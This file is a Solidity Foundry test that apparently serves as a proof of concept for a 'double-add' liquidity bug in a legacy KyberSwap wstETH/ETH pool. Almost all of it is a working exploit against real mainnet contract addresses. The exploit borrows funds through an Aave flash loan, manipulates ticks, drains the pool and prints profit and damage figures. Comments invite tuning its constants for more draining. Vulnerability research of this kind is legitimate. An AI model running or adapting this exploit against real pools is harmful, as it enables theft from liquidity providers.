// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "helpers/Pretty.sol";
import "helpers/BitUtils.sol";


import "forge-std/interfaces/IERC20.sol";

import "src/interfaces/IPool.sol";
import "src/interfaces/periphery/IRouter.sol";
import "src/interfaces/periphery/IBasePositionManager.sol";
import {MathConstants as C} from 'src/libraries/MathConstants.sol';

import {FullMath} from 'src/libraries/FullMath.sol';
import "src/libraries/TickMath.sol";
import "src/libraries/QtyDeltaMath.sol";
import "src/libraries/SwapMath.sol";

// Aave Flash loans
import "src/aave/IFlashloanReceiver.sol";


struct Stats {
    int256 netToken0;
    int256 netToken1;
    uint256 token0Spent;
    uint256 token1Spent;
}

interface StEth is IERC20 {
    function submit(address _referral) external payable;
    function burnShares(address account, uint256 amount) external;
}

interface WstEth {
  function wrap(uint256 _stETHAmount) external returns (uint256);
  function unwrap(uint256 amount) external;
}

interface Weth {
    function withdraw(uint wad) external;
}

contract KyberswapLegacyTest is Test, IFlashLoanReceiver {

    using stdStorage for StdStorage;

    using Pretty for uint256;
    using Pretty for int256;
    using Pretty for uint160;
    using Pretty for int160;
    using Pretty for uint128;
    using Pretty for int128;
    using Pretty for uint8;
    string API_ENDPOINT;

    address WETH_addr   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address wstETH_addr = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address stETH_addr  = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    IERC20 wstETH = IERC20(wstETH_addr);
    IERC20 WETH = IERC20(WETH_addr);
    StEth  stETH = StEth(stETH_addr);

    IPool wstETH_ETH_LEGACY = IPool(0xeBfE63Ba0264aD639B3C41d2bfE1aD708F683bc8);

    IRouter router = IRouter(0xC1e7dFE73E1598E3910EF4C7845B68A9Ab6F4c83);
    IBasePositionManager positionManager = IBasePositionManager(0x2B1c7b41f6A8F2b2bc45C3233a5d5FB3cD6dC9A8);

    bytes32 SQRTP_SLOT_INDEX = bytes32(uint256(3));
    bytes32 BASEL_SLOT_INDEX = bytes32(uint256(4));

    // AAVE
    ILendingPoolAddressesProvider public immutable override ADDRESSES_PROVIDER =
        ILendingPoolAddressesProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5);
    ILendingPool public immutable override LENDING_POOL =
        ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    // Constants for the hack. Play around with these for greater or lesser draining of the pool
    uint256 INITIAL_TOKEN0 = 30_000e18;
    uint128 INITIAL_TOKEN1 = 1000e18;
    int24   TARGET_TICK    = -30_000;
    uint256 HUGE_AMOUNT    = 1_000_000e18;
    uint160 TARGET_SQRTP   = TickMath.getSqrtRatioAtTick(TARGET_TICK);


    function setUp() public {
        API_ENDPOINT = vm.envString("EVMNET_FORK_URL");
        vm.createSelectFork(API_ENDPOINT, 17050000);
        wstETH.approve(address(router), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);
        wstETH.approve(address(positionManager), type(uint256).max);
        WETH.approve(address(positionManager), type(uint256).max);
    }

    function testFullHack() public {
        uint256 LEN = 2;
        address[] memory addresses = new address[](LEN);
        uint256[] memory amounts = new uint256[](LEN);
        uint256[] memory modes = new uint256[](LEN);

        addresses[0] = stETH_addr;
        amounts[0]   = INITIAL_TOKEN0;
        modes[0]     = 0;

        addresses[1] = WETH_addr;
        amounts[1]   = INITIAL_TOKEN1;
        modes[1]     = 0;

        LENDING_POOL.flashLoan(
            address(this),
            addresses,
            amounts,
            modes,
            address(this),
            bytes(""),
            0
        );

        // The rest of the attack appears in performFullHack which is called from executeOperation below.

        console.log("--- After flash loan ---");
        console.log("Final stETH balance = %s", stETH.balanceOf(address(this)).pretty());
        console.log("Final WETH  balance = %s", WETH.balanceOf(address(this)).pretty());

    }

    function performFullHack() internal {

        Stats memory stats;
        uint256 marketPrice = token0InToken1(getSqrtP());
        logXwing();
        logPoolBalances("Initial ", marketPrice);

        int256 initialToken0Balance = int256(uint256(getToken0Balance()));
        int256 initialToken1Balance = int256(uint256(getToken1Balance()));

        stats.token1Spent = INITIAL_TOKEN1;
        {
        (,,uint256 amount0_0, uint256 amount1_0) = positionManager.mint(getMintParams(TARGET_TICK - 1, TARGET_TICK + 1, 0, INITIAL_TOKEN1 - 1));
        (,,uint256 amount0_1, uint256 amount1_1) = positionManager.mint(getMintParams(TARGET_TICK, TARGET_TICK + 1, 1, 1)); // Tick already needs to exist for this hack to work

        stats.netToken1 -= int256(amount1_0 + amount1_1);
        stats.netToken0 -= int256(amount0_0 + amount0_1);
        }

        {
        console.log("TARGET_SQRTP for tick %s = %s", vm.toString(TARGET_TICK), TARGET_SQRTP);
        uint256 wstETHBefore = wstETH.balanceOf(address(this));
        uint256 token1ReceivedOnSwap = router.swapExactInputSingle(getExactInputSingleParams(HUGE_AMOUNT, TARGET_SQRTP, true));
        uint256 wstETHAfter = wstETH.balanceOf(address(this));
        stats.token0Spent += wstETHBefore - wstETHAfter;
        stats.netToken1 += int256(token1ReceivedOnSwap);
        console.log("token0 actually swapped = %s", (wstETHBefore - wstETHAfter).pretty());
        stats.netToken0 -= int256(wstETHBefore - wstETHAfter);
        }

        logPoolState();
        console.log("--- Swap forwards ---");
        router.swapExactInputSingle(getExactInputSingleParams(1, false));
        logPoolState();
        console.log("--- Swap backwards again. Now nearestCurrentTick < currentTick. This is bad ---");

        // Binary search to find exact amount to swap back
        {
        uint256 snapshotId = vm.snapshot();
        uint256 low = 1;
        uint256 high = 10_000;
        while (low < high) {
          uint256 mid = (low + high)/2;
          vm.revertTo(snapshotId);
          snapshotId = vm.snapshot();
          router.swapExactInputSingle(getExactInputSingleParams(mid, true));
          uint160 _sqrtP = getSqrtP();
          if (_sqrtP < TARGET_SQRTP) { // swapped too much
            high = mid;
          } else if (_sqrtP > TARGET_SQRTP) {
            low = mid + 1;
          } else {
            break;
          }
        }

        if ( getCurrentTick() != TARGET_TICK ) {
            console.log("*** Double add of liquidity not possible *** ");
        }
        require(getCurrentTick() == TARGET_TICK, "Double add of liquidity not possible");
        console.log("Swapped backwards with amount = %s", (low + high)/2);
        }

        logPoolState();
        console.log("----- Double liquidity hack beginning ----");

        {
        uint128 amountToken0ToAdd  = getToken0Balance()/2;
        console.log("amountToken0ToAdd = %s", amountToken0ToAdd.pretty());
        (,uint128 liqAdded,uint256 amount0_2,uint256 amount1_2) = positionManager.mint(getMintParams(TARGET_TICK, TARGET_TICK + 10, amountToken0ToAdd, 0));
        console.log("liquidity added = %s", liqAdded.pretty());
        console.log("--- Liquidity is added once ---");
        stats.token0Spent += amount0_2;
        stats.token1Spent += amount1_2;
        stats.netToken0 -= int128(int256(amount0_2));
        stats.netToken1 -= int128(int256(amount1_2));
        }
        logPoolState();

        router.swapExactInputSingle(getExactInputSingleParams(1, false)); // cross the tick and get the double add
        console.log("--- Liquidity is added twice! Uh oh! ---");
        logPoolState();

        logPoolBalances(marketPrice);
        console.log("price (token1/token0) = %s", token0InToken1(getSqrtP()).pretty());
        uint256 token1RequiredToDrain =  getToken0Balance() * token0InToken1(getSqrtP()) / 1e18 ;
        console.log("token1RequiredToDrain = %s", token1RequiredToDrain.pretty());
        uint256 token0Out = router.swapExactInputSingle(getExactInputSingleParams(token1RequiredToDrain, false)); // swap one-for-zero
        stats.netToken1 -= int256(token1RequiredToDrain);
        stats.netToken0 += int256(token0Out);
        logPoolState();

        {
        int256 finalToken0Balance = int256(uint256(getToken0Balance()));
        int256 finalToken1Balance = int256(uint256(getToken1Balance()));
        int256 economicDamage = (initialToken0Balance - finalToken0Balance) * int256(marketPrice) / 1e18 + (initialToken1Balance - finalToken1Balance);
        int256 initialValueInToken1 = initialToken0Balance * int256(marketPrice) / 1e18 + initialToken1Balance;
        int256 economicDamagePercent = economicDamage * 100_000 / initialValueInToken1;

        console.log("\n=== Summary ===\n");
        logPoolBalances("Final ", marketPrice);
        console.log("Initial cost {");
        console.log("  token0 = %s", stats.token0Spent.pretty());
        console.log("  token1 = %s", stats.token1Spent.pretty());
        console.log("}");
        console.log("token0 net = %s", stats.netToken0.pretty());
        console.log("token1 net = %s", stats.netToken1.pretty());
        console.log("Profit (in token1)", (stats.netToken0 * int256(marketPrice) / 1e18 + stats.netToken1).pretty());
        console.log("Economic damage (in token1) = %s", economicDamage.pretty());
        console.log("Economic damage (as percent) = %s%%", economicDamagePercent.pretty(3));
        }
    }

    /*
     *   Getting the system set up just right to do the hack is actually quite hard
     *   1. The tick must exist prior to the attack
     *   2. Then you need to swap back to the target price.  But this actually reduces the currentTick one below the target tick
     *   3. So you need to swap forward by 1, and swap backwards again by a small amount. This puts the system in the right state.
     *   4. Then you can do the double-add bug. This requires nearestTick < targetTick but targetTick == TickMath.getTickAtSqrtRatio(targetTick)
     */

    function notestHackBasics() public {

       int24 currentTick = getCurrentTick();
       uint160 targetSqrtP = TickMath.getSqrtRatioAtTick(currentTick);
       console.log("targetSqrtP = %s", targetSqrtP.pretty());
       logPoolState();

       // STEP 1 Create the tick
       positionManager.mint(getMintParams(currentTick-2, currentTick + 1, 90_000_000e18, 90_000_000e18));
       positionManager.mint(getMintParams(currentTick, currentTick + 1, 1, 1));
       logPoolState();

       // STEP 2 Swap back to target price
       console.log("--- STEP 2. Swap back to target price");
       router.swapExactInputSingle(getExactInputSingleParams(90_000_000e18, targetSqrtP, true));

       logPoolState();
       console.log("--- forwards ---");
       router.swapExactInputSingle(getExactInputSingleParams(1, false));
       logPoolState();
       console.log("--- backwards again. nearestCurrentTick < currentTick ---");
       router.swapExactInputSingle(getExactInputSingleParams(1, true));
       logPoolState();



       console.log("--- STEP 3. Add liquidity");
       (,uint128 liqAdded,,) = positionManager.mint(getMintParams(currentTick, currentTick + 1, 10e18, 10e18));
       console.log("liqAdded = %s", liqAdded.pretty());
       logPoolState();
       router.swapExactInputSingle(getExactInputSingleParams(10e18, false));
       console.log("---- added again ? ----");
       logPoolState();

    }

    /********** HELPERS ***********/

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external override returns (bool) {

        console.log("================================================================");
        console.log("Test demonstrating legacy contracts are vulnerable to double-add");
        console.log("================================================================\n\n\n");


        console.log("--- Before flash loan ---");
        console.log("stETH balance = %s", stETH.balanceOf(address(this)).pretty());
        console.log("WETH  balance = %s", WETH.balanceOf(address(this)).pretty());
        stETH.approve(wstETH_addr, type(uint256).max);
        WstEth(wstETH_addr).wrap(stETH.balanceOf(address(this)));
        console.log("After wrapping, wstETH balance = %s", wstETH.balanceOf(address(this)).pretty());

        performFullHack();

        WstEth(wstETH_addr).unwrap(wstETH.balanceOf(address(this)));

        // Approve the LendingPool contract allowance to *pull* the owed amount
        for (uint256 i = 0; i < assets.length; i++) {
            if (IERC20(assets[i]).balanceOf(address(this)) < amounts[i] + premiums[i] ) {
              revert("Not enough cash to repay flash loan");
            }
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
        }
        return true;
    }

    function totalValue(uint160 marketPrice, uint256 amount0, uint256 amount1) internal view returns (uint256) {
        return amount0 * token0InToken1(marketPrice) / 1e18 + amount1;
    }

    function totalValue(uint160 marketPrice, int256 amount0, int256 amount1) internal view returns (uint256) {
        require(amount0 > 0 && amount1 > 0);
        return totalValue(marketPrice, uint256(amount0), uint256(amount1));
    }

    function logPoolBalances(uint256 marketPrice) internal view {
        logPoolBalances("", marketPrice);
    }

    function logPoolBalances(string memory prefix, uint256 marketPrice) internal view {
        uint256 token0Bal = getToken0Balance();
        uint256 token1Bal = getToken1Balance();
        console.log("%sPool Balances {", prefix);
        console.log("  token0Bal                   = %s", token0Bal.pretty());
        console.log("  token1Bal                   = %s", token1Bal.pretty());
        console.log("  marketPrice (token1/token0) = %s", marketPrice.pretty());
        uint256 token1Value = token0Bal * marketPrice / 1e18 + token1Bal;
        console.log("  Total value (in token1)     = %s", token1Value.pretty());
        console.log("}");
    }

    function getToken0Balance() internal view returns (uint128) {
        return uint128(wstETH_ETH_LEGACY.token0().balanceOf(address(wstETH_ETH_LEGACY)));
    }

    function getToken1Balance() internal view returns (uint128) {
        return uint128(wstETH_ETH_LEGACY.token1().balanceOf(address(wstETH_ETH_LEGACY)));
    }

    function logPoolState() internal view {
        (uint160 sqrtP,int24 currentTick,int24 nearestCurrentTick,) = wstETH_ETH_LEGACY.getPoolState();
        (uint128 baseL,,) = wstETH_ETH_LEGACY.getLiquidityState();
        console.log("PoolState {");
        console.log("  sqrtP              = %s", sqrtP.pretty());
        console.log("  currentTick        = %s", vm.toString(currentTick));
        console.log("  nearestCurrentTick = %s", vm.toString(nearestCurrentTick));
        console.log("  baseL              = %s", baseL.pretty());
        console.log("}");
    }

    function logTick(int24 tick) internal view {
      (uint128 liquidityGross,int128 liquidityNet,,) = wstETH_ETH_LEGACY.ticks(tick);
      console.log("Tick %s {", vm.toString(tick));
      console.log("  liquidityGross = %s", liquidityGross.pretty());
      console.log("  liquidityNet   = %s", liquidityNet.pretty());
      console.log("}");
    }

    function token1InToken0(int24 tick) internal view returns (uint256) {
        return token1InToken0(TickMath.getSqrtRatioAtTick(tick));
    }

    function token1InToken0(uint160 price) internal view returns (uint256) {
        return 10**(wstETH.decimals() + WETH.decimals()) / token0InToken1(price);
    }

    function token0InToken1(int24 tick) internal view returns (uint256) {
        return token0InToken1(TickMath.getSqrtRatioAtTick(tick));
    }

    function token0InToken1(uint160 price) internal view returns (uint256) {
        return 10**(18 + wstETH.decimals() - WETH.decimals()) * (uint256(price) * price) >> 192;
    }

    function getSqrtP() internal view returns (uint160) {
        (uint160 sqrtP,,,) = wstETH_ETH_LEGACY.getPoolState();
        return sqrtP;
    }

    function getCurrentTick() internal view returns (int24) {
        (,int24 currentTick,,) = wstETH_ETH_LEGACY.getPoolState();
        return currentTick;
    }

    function getNearestCurrentTick() internal view returns (int24) {
        (,,int24 nearestCurrentTick,) = wstETH_ETH_LEGACY.getPoolState();
        return nearestCurrentTick;
    }

    function getLiquidity() internal view returns (uint128) {
        (uint128 baseL,,) = wstETH_ETH_LEGACY.getLiquidityState();
        return baseL;
    }

    function setLiquidity(uint128 liquidity) internal {
        setSlotBitRange(BASEL_SLOT_INDEX, 0, 128, uint256(liquidity));
    }

    function setSqrtP(uint160 sqrtP) internal {
        setSlotBitRange(SQRTP_SLOT_INDEX, 0, 160, uint256(sqrtP));
    }

    function setCurrentTick(int24 currentTick) internal {
        setSlotBitRange(SQRTP_SLOT_INDEX, 184, 24, uint256(uint24(currentTick)));
    }

    function setNearestCurrentTick(int24 nearestCurrentTick) internal {
        setSlotBitRange(SQRTP_SLOT_INDEX, 160, 24, uint256(uint24(nearestCurrentTick)));
    }

    /* TODO: Factor these out into a Foundry extension library */

    function getSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length) internal view returns (uint256) {
        return BitUtils.getBitRange(vm.load(address(wstETH_ETH_LEGACY), slotIndex), start, length);
    }

    function setSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length, uint256 value) internal {
        bytes32 slot = vm.load(address(wstETH_ETH_LEGACY), slotIndex);
        vm.store(address(wstETH_ETH_LEGACY), slotIndex, BitUtils.setBitRange(slot, start,length, value));
    }

    function incSlot(bytes32 slot, uint256 n) internal pure returns (bytes32) {
        return bytes32(uint256(slot) + n);
    }

    function storeOffset(address addr, bytes32 slot, uint256 offset, bytes32 value) internal {
        vm.store(addr, bytes32(uint256(slot) + offset), value);
    }

    function getReachAmount(uint160 targetSqrtP) internal view returns (uint256) {
        uint160 sqrtP = getSqrtP();
        uint128 liquidity = getLiquidity();
        uint256 numerator = FullMath.mulDivFloor(
          liquidity,
          sqrtP - targetSqrtP,
          sqrtP
        );
        return FullMath.mulDivFloor(numerator, C.TWO_POW_96, sqrtP);
    }

    function getExactInputSingleParams(uint256 amount, bool zeroForOne) internal view returns (IRouter.ExactInputSingleParams memory) {
        return getExactInputSingleParams(amount, 0, zeroForOne);
    }

    function getExactInputSingleParams(uint256 amount, uint160 limitSqrtP, bool zeroForOne) internal view returns (IRouter.ExactInputSingleParams memory) {
        IRouter.ExactInputSingleParams memory params =
          IRouter.ExactInputSingleParams(
            zeroForOne ? wstETH_addr : WETH_addr ,
            zeroForOne ? WETH_addr : wstETH_addr,
            wstETH_ETH_LEGACY.swapFeeUnits(),
            address(this),
            block.timestamp + 86400,
            amount,
            0,
            limitSqrtP
          );
        return params;
    }

    function getMintParams(int24 lowerTick, int24 upperTick, uint128 amount0, uint128 amount1) internal view returns (IBasePositionManager.MintParams memory) {
        int24[2] memory ticksPrevious;

        ticksPrevious[0] = findFirstInitializedTickLessThan(lowerTick);
        ticksPrevious[1] = findFirstInitializedTickLessThan(upperTick);

        return IBasePositionManager.MintParams(
            wstETH_addr,
            WETH_addr,
            wstETH_ETH_LEGACY.swapFeeUnits(),
            lowerTick,
            upperTick,
            ticksPrevious,
            amount0,
            amount1,
            0,
            0,
            address(this),
            block.timestamp + 86400
        );
    }

    function findFirstInitializedTickLessThan(int24 tick) internal view returns (int24) {
        int24 t = getNearestCurrentTick();
        while (t > tick) {
          (t, ) = wstETH_ETH_LEGACY.initializedTicks(t);
        }
        return t;
    }


    function logXwing() internal view {
      console.log(".-.__        .-.  ___ ");
      console.log("|_|  '--.-.-(   \\/\\;;\\_ .-._______.-. ");
      console.log("(-)___     \\ \\ .-\\ \\;;\\(   \\       \\ \\ ");
      console.log(" Y    '---._\\_((Q)) \\;;\\\\ .-\\     __(_) ");
      console.log(" I           __'-' / .--.((Q))---'    \\, ");
      console.log(" I     ___.-:    \\|  |   \\'-'_          \\ ");
      console.log(" A  .-'      \\ .-.\\   \\   \\ \\ '--.__     '\\ ");
      console.log(" |  |____.----((Q))\\   \\__|--\\_      \\     ' ");
      console.log("    ( )        '-'  \\_  :  \\-' '--.___\\ ");
      console.log("     Y                \\  \\  \\       \\(_) ");
      console.log("     I                 \\  \\  \\         \\, ");
      console.log("     I                  \\  \\  \\          \\ ");
      console.log("     A                   \\  \\  \\          '\\ ");
      console.log("     |                    \\  \\__|           ' ");
      console.log("                           \\_:.  \\ ");
      console.log("                             \\ \\  \\ ");
      console.log("                              \\ \\  \\ ");
      console.log("                               \\_\\_| ");
      console.log("\n\n");
      console.log("      *** SETTING UP FOR OUR ATTACK RUN ***");
      console.log("\n\n");
    }

    receive() external payable {}

}
